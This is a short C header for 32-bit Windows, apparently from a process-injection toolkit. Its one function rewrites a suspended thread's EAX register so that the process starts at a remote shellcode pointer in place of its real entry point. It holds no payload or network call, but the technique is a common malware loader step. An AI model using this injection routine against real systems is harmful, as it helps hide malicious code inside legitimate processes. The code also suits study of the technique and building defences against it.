#pragma once

#include <Windows.h>

//32-bit version
bool patch_context(HANDLE hThread, LPVOID remote_shellcode_ptr)
{
    //get initial context of the target:
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (GetThreadContext(hThread, &context) == FALSE) {
        return false;
    }

    //if the process was created as suspended and didn't run yet, EAX holds it's entry point:
    context.Eax = (DWORD) remote_shellcode_ptr;
    
    if (SetThreadContext(hThread, &context) == FALSE) {
        return false;
    }
    printf("patched context -> EAX = %x\n", context.Eax);
    return true;
}
